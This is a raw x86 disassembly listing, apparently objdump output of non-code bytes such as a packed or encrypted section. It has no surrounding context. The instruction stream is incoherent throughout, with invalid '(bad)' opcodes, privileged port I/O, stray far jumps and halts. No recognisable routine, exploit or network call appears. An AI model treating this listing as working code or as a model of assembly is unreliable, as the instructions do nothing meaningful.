  40fef1:	fnsave [esi]
  40fef3:	lock cmp DWORD PTR ds:0xa87cf488,edi
  40fefa:	out    0xfb,eax
  40fefc:	inc    ecx
  40fefd:	push   0xe23e6e35
  40ff02:	mov    cl,0x95
  40ff04:	ds pop esp
  40ff06:	bound  esp,QWORD PTR [eax-0x612542d]
  40ff0c:	jae    0x40ff5a
  40ff0e:	and    esi,DWORD PTR [edx-0x29]
  40ff11:	bound  edx,QWORD PTR [edi]
  40ff13:	jmp    0xba15:0x8e4db70d
  40ff1a:	push   esp
  40ff1b:	clc    
  40ff1c:	jno    0x40fea1
  40ff1e:	inc    edx
  40ff1f:	iret   
  40ff20:	add    DWORD PTR [esi-0x38],ecx
  40ff23:	cmp    dl,BYTE PTR ds:0x4c492f18
  40ff29:	daa    
  40ff2a:	rcr    DWORD PTR [eax+esi*8],cl
  40ff2d:	(bad)  
  40ff2e:	push   ds
  40ff2f:	mov    bl,0xaa
  40ff31:	xor    bh,ah
  40ff33:	lds    edi,FWORD PTR [edx+0x3e]
  40ff36:	adc    eax,0x96c32a58
  40ff3b:	repnz rol DWORD PTR [ecx-0x68d0c06f],0x63
  40ff43:	adc    BYTE PTR [ebx+0x48],bh
  40ff46:	adc    ebp,DWORD PTR [esi]
  40ff48:	jns    0x40ff0c
  40ff4a:	push   es
  40ff4b:	push   eax
  40ff4c:	test   al,0x48
  40ff4e:	sbb    BYTE PTR [eax-0xd08fab1],bl
  40ff54:	cmc    
  40ff55:	sbb    BYTE PTR [ebp+0x15],bh
  40ff58:	aaa    
  40ff59:	sub    al,0x69
  40ff5b:	pop    edi
  40ff5c:	lea    ecx,[ebx-0x79a1beee]
  40ff62:	fwait
  40ff63:	shl    DWORD PTR [ebx+0x3b],1
  40ff66:	sti    
  40ff67:	xchg   ebp,eax
  40ff68:	dec    esp
  40ff69:	aaa    
  40ff6a:	sub    DWORD PTR [eax+0x6fc28fa2],edx
  40ff70:	sbb    ebp,DWORD PTR [edx]
  40ff72:	loope  0x40ff7c
  40ff74:	or     al,0xb6
  40ff76:	scas   eax,DWORD PTR es:[edi]
  40ff77:	mov    dl,0x13
  40ff79:	fisubr WORD PTR [ecx+ebx*1+0x1efbe3e]
  40ff80:	dec    BYTE PTR [ecx+0x2b9e178c]
  40ff86:	or     edx,DWORD PTR [eax]
  40ff88:	dec    edi
  40ff89:	sub    BYTE PTR [edi+0x3f0164d],ch
  40ff8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff90:	iret   
  40ff91:	int    0x38
  40ff93:	inc    edx
  40ff94:	push   cs
  40ff95:	sbb    WORD PTR [esi],dx
  40ff98:	pop    ebx
  40ff99:	pop    ebx
  40ff9a:	sub    cl,bh
  40ff9c:	leave  
  40ff9d:	out    dx,al
  40ff9e:	stos   DWORD PTR es:[edi],eax
  40ff9f:	enter  0x9a12,0x17
  40ffa3:	xchg   esp,eax
  40ffa4:	daa    
  40ffa5:	mov    bl,0x34
  40ffa7:	cdq    
  40ffa8:	jl     0x40ffc5
  40ffaa:	fld    TBYTE PTR [ecx+eiz*1-0x1b084978]
  40ffb1:	out    0x15,al
  40ffb3:	inc    edi
  40ffb4:	cs pop edi
  40ffb6:	ss clc 
  40ffb8:	out    dx,al
  40ffb9:	sbb    eax,0x25bc5a25
  40ffbe:	mov    bl,0x58
  40ffc0:	call   DWORD PTR [eax-0x226511f5]
  40ffc6:	jns    0x40ff6f
  40ffc8:	and    al,0x16
  40ffca:	into   
  40ffcb:	sbb    BYTE PTR [ebp+0x7d],cl
  40ffce:	imul   BYTE PTR [eax]
  40ffd0:	adc    al,0xf5
  40ffd2:	jecxz  0x410036
  40ffd4:	jnp    0x410025
  40ffd6:	icebp  
  40ffd7:	add    esp,esi
  40ffd9:	aaa    
  40ffda:	or     eax,0x7d75ee94
  40ffdf:	jle    0x40ffd4
  40ffe1:	push   es
  40ffe2:	adc    eax,DWORD PTR [edi+0x77]
  40ffe5:	fnstsw WORD PTR [eax]
  40ffe7:	push   ss
  40ffe8:	ror    DWORD PTR [ebp-0x4b],1
  40ffeb:	mov    dh,0x99
  40ffed:	inc    ebx
  40ffee:	push   edi
  40ffef:	sbb    al,0xb2
  40fff1:	mov    bh,0x18
  40fff3:	loop   0x40ffa7
  40fff5:	mov    gs,ebx
  40fff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fff8:	and    al,0x37
  40fffa:	jmp    FWORD PTR [esi]
  40fffc:	inc    ebx
  40fffd:	pusha  
  40fffe:	hlt    
  40ffff:	sub    edi,DWORD PTR [esp+ebp*8-0x68bbea6]
  410006:	jle    0x40ffc1
  410008:	and    eax,DWORD PTR [edi-0x444d4a08]
  41000e:	(bad)  
  41000f:	dec    ebp
  410010:	fcomi  st,st(5)
  410012:	push   ebp
  410013:	mov    al,ds:0x3fef807a
  410018:	dec    esi
  410019:	sub    al,0x7c
  41001b:	inc    esp
  41001c:	mov    BYTE PTR [eax+0xd],bh
  41001f:	mov    cl,0x10
  410021:	xchg   esi,eax
  410022:	xlat   BYTE PTR ds:[ebx]
  410023:	rol    DWORD PTR [esi+esi*2],0x5c
  410027:	hlt    
  410028:	mov    al,0xe9
  41002a:	inc    esi
  41002b:	in     al,0xbb
  41002d:	sub    BYTE PTR [edi],cl
  41002f:	loope  0x410042
  410031:	cmp    al,0xb4
  410033:	pop    es
  410034:	or     esi,DWORD PTR [esi]
  410036:	pop    edi
  410037:	frstor [eax]
  410039:	rol    BYTE PTR [eax],cl
  41003b:	jecxz  0x41006f
  41003d:	xchg   ebp,eax
  41003e:	int3   
  41003f:	fidiv  DWORD PTR [ecx]
  410041:	mov    esp,0xfc16563e
  410046:	or     ecx,ebp
  410048:	into   
  410049:	mov    ebp,0x68c85967
  41004e:	addr16 pushf 
  410050:	xor    esi,ecx
  410052:	fisub  DWORD PTR [edi+0xcbdf67a]
  410058:	jecxz  0x4100c7
  41005a:	add    al,0xaf
  41005c:	sub    eax,0xdc6bf354
  410061:	out    dx,eax
  410062:	(bad)  
  410064:	mov    al,ds:0x2cfce273
  410069:	xchg   edx,eax
  41006a:	repz xchg di,ax
  41006d:	dec    esp
  41006e:	ins    DWORD PTR es:[edi],dx
  41006f:	push   ebx
  410070:	dec    edi
  410071:	mov    al,0x0
  410073:	pop    es
  410074:	lahf   
  410075:	inc    edi
  410076:	int3   
  410077:	jb     0x4100be
  410079:	push   0xffffffee
  41007b:	add    eax,0xf0f07a1f
  410080:	jle    0x410044
  410082:	(bad)  
  410084:	and    DWORD PTR [edi-0x77526402],esp
  41008a:	add    al,0x37
  41008c:	sbb    BYTE PTR [eax-0x5bb10810],0xc8
  410093:	cmp    edi,DWORD PTR [eax]
  410095:	std    
  410096:	div    DWORD PTR [edi+0x43]
  410099:	inc    esi
  41009a:	and    eax,0x9e2dc015
  41009f:	out    0x36,al
  4100a1:	dec    ebx
  4100a2:	push   esp
  4100a3:	jae    0x41002f
  4100a5:	aaa    
  4100a6:	and    BYTE PTR [edx+0x2278fa42],al
  4100ac:	pop    ds
  4100ad:	pop    ebx
  4100ae:	and    cl,BYTE PTR [edx]
  4100b0:	pusha  
  4100b1:	dec    edi
  4100b2:	jmp    0x5ea2:0xfbe8ec0a
  4100b9:	dec    ebx
  4100ba:	pop    es
  4100bb:	ja     0x4100fd
  4100bd:	jae    0x41008a
  4100bf:	or     eax,0x24316505
  4100c4:	leave  
  4100c5:	es sbb ecx,edi
  4100c8:	mov    ds:0x20ba974f,eax
  4100cd:	repnz mov eax,0xe6aa8b72
  4100d3:	inc    eax
  4100d4:	dec    ecx
  4100d5:	enter  0x694b,0x54
  4100d9:	aaa    
  4100da:	push   edx
  4100db:	js     0x410077
  4100dd:	sbb    al,BYTE PTR [ebp+eax*1+0x70]
  4100e1:	clc    
  4100e2:	inc    edx
  4100e3:	in     al,0xcb
  4100e5:	test   eax,0x4a05b4cd
  4100ea:	scas   al,BYTE PTR es:[edi]
  4100eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ec:	test   BYTE PTR [esi-0x3fec9f34],ch
  4100f2:	sbb    DWORD PTR [ebx+0x3c75274b],ebx
  4100f8:	sub    DWORD PTR [edi-0x3e],esi
  4100fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100fc:	scas   al,BYTE PTR es:[edi]
  4100fd:	xchg   esi,eax
  4100fe:	imul   ax,WORD PTR ds:[ebx+0xb002788],0xff97
  410107:	loop   0x41008e
  410109:	inc    ebx
  41010a:	inc    ecx
  41010b:	pusha  
  41010c:	ds mov ecx,0x5d3fd44f
  410112:	inc    edx
  410113:	ja     0x4100bf
  410115:	dec    edx
  410116:	test   BYTE PTR [eax+0x30],bh
  410119:	dec    esp
  41011a:	ret    
  41011b:	jmp    0xc880:0x6e904770
  410122:	dec    ebx
  410123:	dec    ebx
  410124:	mov    ch,0x18
  410126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410127:	add    BYTE PTR [ecx],ah
  410129:	mov    esp,0x6d120b1d
  41012e:	xchg   esp,eax
  41012f:	cmp    edi,DWORD PTR [ecx+0x55]
  410132:	mov    cs,WORD PTR [eax-0x11]
  410135:	out    0x20,al
  410137:	neg    edx
  410139:	aas    
  41013a:	inc    edi
  41013b:	inc    edx
  41013c:	pop    ss
  41013d:	lahf   
  41013e:	aas    
  41013f:	mov    eax,0xa405b49c
  410144:	mov    es,WORD PTR [ecx]
  410146:	std    
  410147:	(bad)  
  410148:	fistp  WORD PTR [edi]
  41014a:	mov    dh,0x42
  41014c:	in     eax,dx
  41014d:	int    0x28
  41014f:	sar    DWORD PTR [ebx-0x20],1
  410152:	mov    DWORD PTR [eax-0x3b],ebx
  410155:	xchg   ebx,eax
  410156:	ins    BYTE PTR es:[edi],dx
  410157:	bound  edx,QWORD PTR [ecx+eax*8-0x1c]
  41015b:	sub    BYTE PTR ds:0xf5c5aeee,0x22
  410162:	jecxz  0x41011a
  410164:	je     0x4100f9
  410166:	inc    edx
  410167:	inc    ecx
  410168:	iret   
  410169:	xchg   BYTE PTR [edx+0x279645e2],dh
  41016f:	jecxz  0x4101ad
  410171:	cmp    al,0x0
  410173:	ret    
  410174:	aam    0xe1
  410176:	dec    edx
  410177:	dec    ebx
  410178:	xor    eax,0x12b9bc6
  41017d:	inc    edi
  41017e:	sub    BYTE PTR [ebx-0x3d],bh
  410181:	jmp    0x8e132ba9
  410186:	xchg   edx,eax
  410187:	(bad)  
  410188:	out    0x17,eax
  41018a:	fmul   QWORD PTR [eax+0x34]
  41018d:	dec    esi
  41018e:	lods   al,BYTE PTR ds:[esi]
  41018f:	stc    
  410190:	push   eax
  410191:	adc    edx,esi
  410193:	jbe    0x41012e
  410195:	mov    bh,0x5
  410197:	(bad)  [ecx]
  410199:	stos   DWORD PTR es:[edi],eax
  41019a:	pop    ss
  41019b:	add    esp,edx
  41019d:	cmp    BYTE PTR [edi],dh
  41019f:	in     al,0x53
  4101a1:	sbb    eax,0x76136dd6
  4101a6:	out    0x22,eax
  4101a8:	mov    esi,cs
  4101aa:	xor    ah,BYTE PTR [ebx+0x29]
  4101ad:	pop    edi
  4101ae:	inc    ebp
  4101af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b0:	stos   BYTE PTR es:[edi],al
  4101b1:	(bad)  
  4101b2:	fnsave [edx]
  4101b4:	stc    
  4101b5:	inc    ecx
  4101b6:	(bad)  
  4101b7:	sti    
  4101b8:	or     DWORD PTR [ecx+0x33],0x3fc9d548
  4101bf:	and    al,0xd
  4101c1:	mov    eax,ds:0x1685d79f
  4101c6:	jmp    0xdb84:0x22a0c2c8
  4101cd:	neg    al
  4101cf:	mov    dl,0x16
  4101d1:	stos   DWORD PTR es:[edi],eax
  4101d2:	add    BYTE PTR ds:[eax+eax*8+0x7f],0x62
  4101d8:	in     eax,0x6a
  4101da:	xchg   ebp,eax
  4101db:	mov    bl,0x2d
  4101dd:	in     eax,dx
  4101de:	xor    DWORD PTR [ecx],edi
  4101e0:	les    esp,FWORD PTR [esi]
  4101e2:	xchg   ebp,eax
  4101e3:	jp     0x41021b
  4101e5:	add    eax,0xc067e72c
  4101ea:	or     al,0x87
  4101ec:	lock mov al,0x8
  4101ef:	js     0x41023a
  4101f1:	or     DWORD PTR [ebx-0x62881246],edx
  4101f7:	jne    0x410247
  4101f9:	stos   BYTE PTR es:[edi],al
  4101fa:	in     eax,0x44
  4101fc:	lods   eax,DWORD PTR ds:[esi]
  4101fd:	dec    esi
  4101fe:	out    dx,eax
  4101ff:	popf   
  410200:	xchg   edi,eax
  410201:	push   es
  410202:	ret    0x9122
  410205:	xor    DWORD PTR [esp+eax*1+0x66],edx
  410209:	dec    edi
  41020a:	mov    ?,WORD PTR [eax]
  41020c:	push   ss
  41020d:	add    al,0xd
  41020f:	stos   BYTE PTR es:[edi],al
  410210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410211:	fwait
  410212:	dec    esi
  410213:	add    al,0x6a
  410215:	je     0x4101c1
  410217:	xchg   esi,eax
  410218:	(bad)  [edx+0x66]
  41021b:	into   
  41021c:	mov    dh,0xf0
  41021e:	adc    ebp,edi
  410220:	(bad)  
  410221:	pextrw ecx,mm4,0x65
  410225:	adc    DWORD PTR [eax],esp
  410227:	jae    0x41023f
  410229:	test   DWORD PTR [edx],ecx
  41022b:	sti    
  41022c:	imul   eax
  41022e:	(bad)  [eax+0x46]
  410231:	jp     0x4101c3
  410233:	mov    cl,0x8d
  410235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410236:	mul    BYTE PTR [esi-0x57c4cab1]
  41023c:	out    dx,eax
  41023d:	xchg   edi,eax
  41023e:	jns    0x41022f
  410240:	jg     0x4101dd
  410242:	daa    
  410243:	jl     0x41023a
  410245:	jae    0x41026e
  410247:	lock xor BYTE PTR [edx+0x31],ch
  41024b:	dec    ebp
  41024c:	imul   esp,DWORD PTR [eax],0xb72be22a
  410252:	jg     0x41022e
  410254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410255:	loop   0x410205
  410257:	adc    ebp,ebp
  410259:	(bad)  [ebp-0x65]
  41025c:	ror    BYTE PTR [eax+0x33],1
  41025f:	jp     0x410237
  410261:	lock repnz cmp al,ch
  410265:	(bad)  
  410266:	icebp  
  410267:	jle    0x410254
  410269:	test   eax,0xfce94b43
  41026e:	dec    ebp
  41026f:	pop    eax
  410270:	add    al,0xa0
  410272:	ins    BYTE PTR es:[edi],dx
  410273:	and    al,0x6a
  410275:	scas   eax,DWORD PTR es:[edi]
  410276:	jbe    0x4102c1
  410278:	push   eax
  410279:	sti    
  41027a:	jb     0x410236
  41027c:	das    
  41027d:	das    
  41027e:	push   edx
  41027f:	push   ebp
  410280:	int    0xf0
  410282:	inc    ecx
  410283:	pop    edi
  410284:	xchg   esp,eax
  410285:	xchg   ebp,eax
  410286:	outs   dx,DWORD PTR ds:[esi]
  410287:	jns    0x410274
  410289:	bound  esi,QWORD PTR [ebp-0xd]
  41028c:	sbb    BYTE PTR [esi+0x4e],ch
  41028f:	(bad)  
  410290:	repnz rol DWORD PTR [edi],0xa
  410294:	outs   dx,DWORD PTR ds:[esi]
  410295:	es out dx,eax
  410297:	(bad)  
  410298:	mov    eax,0xd18f19a1
  41029d:	pop    ebx
  41029e:	push   edi
  41029f:	xor    eax,0x18593ae5
  4102a4:	pushf  
  4102a5:	iret   
  4102a6:	push   esi
  4102a7:	lahf   
  4102a8:	cmc    
  4102a9:	loopne 0x410241
  4102ab:	dec    ecx
  4102ac:	push   0x41
  4102ae:	mov    edx,0x69e8e25
  4102b3:	pop    ss
  4102b4:	or     eax,0xe31d09d5
  4102b9:	pop    edx
  4102ba:	push   ebx
  4102bb:	out    0xa5,al
  4102bd:	je     0x410306
  4102bf:	test   eax,0x3bc02547
  4102c4:	jne    0x41031d
  4102c6:	cmp    ebx,ebp
  4102c8:	outs   dx,DWORD PTR ds:[esi]
  4102c9:	aam    0x46
  4102cb:	lods   eax,DWORD PTR ss:[esi]
  4102cd:	adc    al,0x3
  4102cf:	and    al,0x49
  4102d1:	xchg   edi,eax
  4102d2:	ret    0x4b40
  4102d5:	pop    esp
  4102d6:	push   0x4a26bc2
  4102db:	add    eax,0xa1b2a019
  4102e0:	mov    ebx,0xe00679aa
  4102e5:	outs   dx,DWORD PTR ds:[esi]
  4102e6:	or     dh,BYTE PTR [eax-0x17555b3e]
  4102ec:	sbb    edi,DWORD PTR [eax+0x726c45fb]
  4102f2:	inc    esp
  4102f3:	xor    eax,0xa186bf26
  4102f8:	push   cs
  4102f9:	xchg   ebx,eax
  4102fa:	outs   dx,DWORD PTR ds:[esi]
  4102fb:	imul   edx,DWORD PTR [ebx-0x6c214c79],0x87f23483
  410305:	mov    cl,0x40
  410307:	retf   0x9b1d
  41030a:	loope  0x410359
  41030c:	jle    0x41030b
  41030e:	mov    bl,0xdf
  410310:	sub    ch,BYTE PTR [edi+0x4a]
  410313:	add    dh,BYTE PTR [ecx+0x7b4c0128]
  410319:	dec    ebx
  41031a:	mov    esp,0x772704b1
  41031f:	sbb    edx,DWORD PTR [edx]
  410321:	call   0x5380:0xadd2bcd1
  410328:	add    DWORD PTR [edi],esi
  41032a:	push   ebx
  41032b:	(bad)  
  41032c:	mov    ?,WORD PTR [di+0x7be]
  410331:	scas   eax,DWORD PTR es:[edi]
  410332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410333:	lock mov ?,edx
  410336:	std    
  410337:	or     dh,cl
  410339:	jmp    0x637f6b3
  41033e:	repz jg 0x410383
  410341:	sbb    ebx,edx
  410343:	and    DWORD PTR [ebx+0x234c5b21],ebx
  410349:	sbb    eax,0xdc3bc1c6
  41034e:	cmp    eax,0xb3e7e21c
  410353:	jge    0x410351
  410355:	fld    QWORD PTR [edx+0x5f]
  410358:	lea    ebx,[ecx]
  41035a:	or     eax,0x2748fc4
  41035f:	out    0x4d,al
  410361:	push   ecx
  410362:	and    ah,bl
  410364:	pop    edi
  410365:	repnz into 
  410367:	push   ds
  410368:	cmp    esi,esp
  41036a:	jge    0x41038b
  41036c:	adc    al,0x48
  41036e:	shl    ebx,cl
  410370:	div    DWORD PTR [edi+0x29]
  410373:	das    
  410374:	leave  
  410375:	mov    BYTE PTR [esi],dh
  410377:	jnp    0x41035b
  410379:	mov    al,0xa0
  41037b:	pop    edi
  41037c:	aaa    
  41037d:	into   
  41037e:	ret    0x3638
  410381:	add    esi,DWORD PTR [ebx-0x6d]
  410384:	in     al,dx
  410385:	bound  edx,QWORD PTR [edx]
  410387:	sub    esi,DWORD PTR [edi+0x4f]
  41038a:	xchg   esi,eax
  41038b:	shl    BYTE PTR [bx+si+0x9ec],0x22
  410391:	dec    ebx
  410392:	or     al,0x8
  410394:	dec    ecx
  410395:	xchg   esp,eax
  410396:	mov    eax,ds:0x47b6929a
  41039b:	push   ss
  41039c:	jg     0x4103fa
  41039e:	cs sahf 
  4103a0:	ja     0x410392
  4103a2:	or     dh,BYTE PTR [eax]
  4103a4:	mov    esp,DWORD PTR [ebx+0x1c]
  4103a7:	mov    WORD PTR [edx+eiz*1-0x6224e368],?
  4103ae:	push   ebp
  4103af:	mov    dh,0x14
  4103b1:	jmp    0xc3e4:0x2ed79186
  4103b8:	fsubr  DWORD PTR [eax+0x2bc709ba]
  4103be:	lea    eax,[edx]
  4103c0:	xor    edi,esp
  4103c2:	inc    edi
  4103c3:	outs   dx,BYTE PTR ds:[esi]
  4103c4:	adc    ebx,0x2
  4103c7:	stos   DWORD PTR es:[edi],eax
  4103c8:	jae    0x410433
  4103ca:	bound  esp,QWORD PTR [ecx-0x4a8271ae]
  4103d0:	mov    ebp,0x99a0924a
  4103d5:	mov    bh,0x30
  4103d7:	push   eax
  4103d8:	rol    ecx,cl
  4103da:	stc    
  4103db:	sbb    ch,0x48
  4103de:	gs mul cl
  4103e1:	ins    DWORD PTR es:[edi],dx
  4103e2:	repz xchg ecx,eax
  4103e4:	inc    esi
  4103e5:	xchg   ecx,eax
  4103e6:	aaa    
  4103e7:	ins    DWORD PTR es:[edi],dx
  4103e8:	mov    ecx,0x12c11575
  4103ed:	adc    DWORD PTR [ebp-0x78723a7d],eax
  4103f3:	xor    DWORD PTR [eax+ecx*8-0x698a097e],eax
  4103fa:	in     eax,dx
  4103fb:	test   DWORD PTR [edx-0x69],ebp
  4103fe:	cdq    
  4103ff:	ror    BYTE PTR [ecx*2+0x73728a32],1
  410406:	xor    edx,DWORD PTR [edi-0x4f8ffdf7]
  41040c:	inc    ebp
  41040d:	outs   dx,DWORD PTR ds:[esi]
  41040e:	int    0xea
  410410:	pop    edi
  410411:	in     eax,0xf2
  410413:	jnp    0x410492
  410415:	ret    
  410416:	dec    eax
  410417:	jns    0x41039d
  410419:	out    dx,al
  41041a:	mov    ch,0x17
  41041c:	add    DWORD PTR [eax],ebx
  41041e:	sbb    eax,0x35f2339a
  410423:	mov    ecx,0xad47031b
  410428:	fist   DWORD PTR [ecx]
  41042a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042b:	pusha  
  41042c:	outs   dx,BYTE PTR ds:[esi]
  41042d:	scas   al,BYTE PTR es:[edi]
  41042e:	xlat   BYTE PTR ds:[ebx]
  41042f:	fldenv [esi]
  410431:	inc    ecx
  410432:	push   es
  410433:	adc    eax,eax
  410435:	(bad)  
  410436:	lock adc DWORD PTR [ebp-0x15],esi
  41043a:	xchg   BYTE PTR [esi-0x59],bl
  41043d:	test   DWORD PTR [ebx+ecx*4-0x2e5d5382],esp
  410444:	out    dx,eax
  410445:	adc    bh,BYTE PTR [eax+ecx*1+0x4e]
  410449:	and    bl,bl
  41044b:	adc    eax,0x3eff9731
  410450:	fadd   DWORD PTR [esi-0x21]
  410453:	pop    es
  410454:	cdq    
  410455:	and    eax,0xc2f1e74e
  41045a:	push   esp
  41045b:	sub    ecx,ecx
  41045d:	inc    eax
  41045e:	scas   eax,DWORD PTR es:[edi]
  41045f:	std    
  410460:	(bad)  [eax]
  410462:	arpl   bx,cx
  410464:	rcl    dl,0x7e
  410467:	mov    edi,0xfd8a6b0
  41046c:	inc    eax
  41046d:	mov    al,ds:0x5fd43eac
  410472:	lahf   
  410473:	mov    ds:0x73705169,al
  410478:	dec    esi
  410479:	or     ch,bl
  41047b:	push   edi
  41047c:	stc    
  41047d:	mov    esi,0x6cd7862d
  410482:	pop    ecx
  410483:	jne    0x4104c8
  410485:	ins    DWORD PTR es:[edi],dx
  410486:	pusha  
  410487:	scas   eax,DWORD PTR es:[edi]
  410488:	(bad)  
  410489:	shl    BYTE PTR [edi+ebp*1-0x80],cl
  41048d:	adc    dl,al
  41048f:	add    al,BYTE PTR [edx-0x66]
  410492:	and    esi,edx
  410494:	cli    
  410495:	add    BYTE PTR [ebx+0x0],al
	...
  410514:	imul   eax,DWORD PTR gs:[ebx+0x6def8fef],0xffffffeb
  41051c:	pop    edx
  41051d:	sar    ecx,cl
  41051f:	sbb    ebp,DWORD PTR [edi+0x1d]
  410522:	pop    esp
  410523:	mov    ch,0x57
  410525:	mov    al,0x0
  410527:	add    BYTE PTR [ebx+0x7],ch
  41052a:	add    BYTE PTR [eax],al
  41052c:	mov    esi,0xe8c08df0
  410531:	sbb    bl,BYTE PTR [eax]
  410533:	sbb    edi,eax
  410535:	or     bh,BYTE PTR [ecx+eax*1-0x61]
  410539:	les    ebx,FWORD PTR [edx+edx*1]
  41053c:	mov    ah,0x17
  41053e:	adc    BYTE PTR [edx+ecx*8],cl
  410541:	xchg   edx,eax
  410542:	lahf   
  410543:	addr16 sub al,0x1b
  410546:	call   DWORD PTR [esi]
  410548:	imul   ebp,DWORD PTR [edi+0x2e04d317],0xa734def0
  410552:	mov    ebp,0x155d1b86
  410557:	cwde   
  410558:	js     0x4105cb
  41055a:	in     eax,dx
  41055b:	hlt    
  41055c:	add    DWORD PTR [eax],ebx
  41055e:	jl     0x4104f8
  410560:	imul   esp,DWORD PTR [eax+0x6c2bd226],0xa
  410567:	aaa    
  410568:	xchg   DWORD PTR [ebx+0x38],ecx
  41056b:	out    dx,eax
  41056c:	cmp    al,0xc5
  41056e:	ja     0x410599
  410570:	test   bl,0x44
  410573:	dec    esp
  410574:	adc    BYTE PTR [edx-0x1e],cl
  410577:	sbb    ebp,DWORD PTR [eax+0x37]
  41057a:	or     ch,BYTE PTR [edx+edx*1]
  41057d:	les    eax,FWORD PTR [eax+ebp*2-0x131866ca]
  410584:	xlat   BYTE PTR ds:[ebx]
  410585:	lock or al,0xab
  410588:	dec    ecx
  410589:	push   esp
  41058a:	sub    eax,0x17d102f7
  41058f:	xor    DWORD PTR [eax],esi
  410591:	mov    ds,WORD PTR [edi-0x53]
  410594:	in     al,0x45
  410596:	push   edi
  410597:	in     al,dx
  410598:	jle    0x4105d3
  41059a:	dec    ebp
  41059b:	test   al,0xe
  41059d:	ds cld 
  41059f:	(bad)  
  4105a0:	xchg   edx,eax
  4105a1:	imul   ebp,DWORD PTR [edi+ecx*1-0x4a],0xffffff88
  4105a6:	push   eax
  4105a7:	jne    0x41061f
  4105a9:	xchg   esp,eax
  4105aa:	and    BYTE PTR [esi],0xa1
  4105ad:	jnp    0x4105fc
  4105af:	rcr    DWORD PTR [ecx+0x4430dee0],0x5d
  4105b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105b7:	arpl   cx,cx
  4105b9:	sar    DWORD PTR [edx-0x1e6c03c6],0xce
  4105c0:	jb     0x4105f7
  4105c2:	xor    eax,0xff7d93b0
  4105c7:	mov    cl,0x6d
  4105c9:	jns    0x410569
  4105cb:	nop
  4105cc:	pop    ebp
  4105cd:	cmp    al,0xfe
  4105cf:	sbb    edi,ebp
  4105d1:	aas    
  4105d2:	mov    ds:0xc1d1253d,al
  4105d7:	ror    dl,1
  4105d9:	add    edx,esi
  4105db:	sbb    ecx,ebx
  4105dd:	xor    eax,0xf0d126cb
  4105e2:	cld    
  4105e3:	call   0xd86c:0xa5ee4a85
  4105ea:	cmp    ebp,esp
  4105ec:	push   es
  4105ed:	or     BYTE PTR [ebp-0x5e],ah
  4105f0:	jbe    0x41062c
  4105f2:	cwde   
  4105f3:	pop    ebx
  4105f4:	sbb    ah,BYTE PTR [esp+edx*2-0x2dfb9b24]
  4105fb:	cld    
  4105fc:	aad    0x8c
  4105fe:	and    BYTE PTR ds:0x5e40461c,0x9c
  410605:	pop    es
  410606:	pop    ecx
  410607:	mov    al,ds:0xf19153e8
  41060c:	jge    0x4105b6
  41060e:	mov    ah,ch
  410610:	fld    TBYTE PTR [edx-0x2044463d]
  410616:	inc    dl
  410618:	aam    0x90
  41061a:	mov    dl,0x37
  41061c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41061d:	jge    0x41064a
  41061f:	sbb    DWORD PTR [ebp+0x21d0dcfe],edi
  410625:	or     al,0x90
  410627:	(bad)  
  410628:	xchg   esi,eax
  410629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41062a:	sub    al,0xb6
  41062c:	outs   dx,DWORD PTR ds:[esi]
  41062d:	in     al,dx
  41062e:	push   ds
  41062f:	mov    eax,ds:0x1a058bee
  410634:	call   0x5d07a6f2
  410639:	clc    
  41063a:	jle    0x41062b
  41063c:	int3   
  41063d:	mov    bl,0x25
  41063f:	iret   
  410640:	mov    ebp,cs
  410642:	xchg   ecx,eax
  410643:	mov    ch,0x8a
  410645:	pop    ss
  410646:	inc    eax
  410647:	adc    DWORD PTR [edi-0x23],0xffffff97
  41064b:	jg     0x410645
  41064d:	call   0xd506:0x33a6c9f0
  410654:	or     eax,0xf9beb987
  410659:	popf   
  41065a:	xor    ah,BYTE PTR [ebx-0x49]
  41065d:	and    ch,bh
  41065f:	stc    
  410660:	push   edx
  410661:	cs popa 
  410663:	lea    ebx,[edx-0x7b]
  410666:	xchg   BYTE PTR [ebp-0x6b],bl
  410669:	test   al,dh
  41066b:	out    dx,eax
  41066c:	retf   
  41066d:	int3   
  41066e:	shr    BYTE PTR [ebx-0x6d],cl
  410671:	mov    bh,BYTE PTR [ebx-0x640df423]
  410677:	xchg   ecx,eax
  410678:	imul   edi,edx,0x549f4b0d
  41067e:	(bad)  
  41067f:	cmp    cl,BYTE PTR [eax+edx*1+0x583d2973]
  410686:	loopne 0x41065d
  410688:	sbb    WORD PTR [edi-0xa],sp
  41068c:	mov    gs,edi
  41068e:	out    0x9,eax
  410690:	sub    ecx,edi
  410692:	or     esp,DWORD PTR [edi]
  410694:	or     eax,0xce9eae1f
  410699:	pop    ds
  41069a:	in     al,dx
  41069b:	cs xchg ebp,eax
  41069d:	in     al,dx
  41069e:	imul   ebp,DWORD PTR [ebp+0x589a11ab],0x71fabd43
  4106a8:	jae    0x410635
  4106aa:	in     al,0x2c
  4106ac:	je     0x4106c0
  4106ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106af:	jbe    0x410650
  4106b1:	and    DWORD PTR [eax+eax*4],edi
  4106b4:	aas    
  4106b5:	jb     0x410715
  4106b7:	leave  
  4106b8:	retf   0x3b9b
  4106bb:	xor    dh,dl
  4106bd:	add    al,0x2a
  4106bf:	ss sti 
  4106c1:	data16 cld 
  4106c3:	cmovl  esp,DWORD PTR [edx*2-0x51265a57]
  4106cb:	outs   dx,DWORD PTR ds:[esi]
  4106cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106cd:	and    eax,0x96fcd890
  4106d2:	clc    
  4106d3:	(bad)  
  4106d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106d5:	enter  0xbebf,0x3d
  4106d9:	gs dec edi
  4106db:	pop    ebx
  4106dc:	mov    ebx,0xeefc4195
